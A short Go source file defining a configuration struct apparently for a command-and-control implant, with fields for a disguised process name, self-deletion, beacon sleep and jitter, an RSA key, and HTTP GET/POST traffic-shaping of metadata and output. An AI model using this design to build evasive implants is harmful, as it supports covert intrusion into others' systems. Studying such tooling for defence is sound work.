package profile

type ProConfig struct {
	Setting struct {
		ProcessName  string `json:"processName"` //伪装进程名
		DeleteSelf   bool   `json:"deleteSelf"`  //是否自己删除
		Sleep        int    `json:"sleep"`
		Jitter       int    `json:"jitter"`
		RsaPublicKey string `json:"rsaPublicKey"` //base64加密处理一些
	}
	Header struct {
		Host      string `json:"host"`
		UserAgent string `json:"user_agent"`
	}
	HttpGet struct {
		Url               string   `json:"url"`
		MetadataCrypt     []string `json:"metadata_crypt"`
		MetadataPrepend   string   `json:"metadata_prepend"`
		MetadataAppend    string   `json:"metadata_append"`
		MetadataType      string   `json:"metadata_type"`
		MetadataTypeValue string   `json:"metadata_type_value"`
		OutPutCrypt       []string `json:"out_put_crypt"`
		OutPutPrependLen  int      `json:"out_put_prepend_len"` //获取输出长度-前
		OutPutAppendLen   int      `json:"out_put_append_len"`  //获取get输出的长度 - 后
	}
	HttpPost struct {
		Url                   string   `json:"url"`
		IdCrypt               []string `json:"idCrypt"`
		IdPrepend             string   `json:"idPrepend"`
		IdAppend              string   `json:"idAppend"`
		IdType                string   `json:"idType"`
		IdTypeValue           string   `json:"idTypeValue"`
		ClientOutputCrypt     []string `json:"clientOutputCrypt"`
		ClientOutputType      string   `json:"clientOutputType"`
		ClientOutputTypeValue string   `json:"clientOutputTypeValue"`
		ClientOutputPrepend   string   `json:"clientOutputPrepend"`
		ClientOutputAppend    string   `json:"clientOutputAppend"`
	}
}
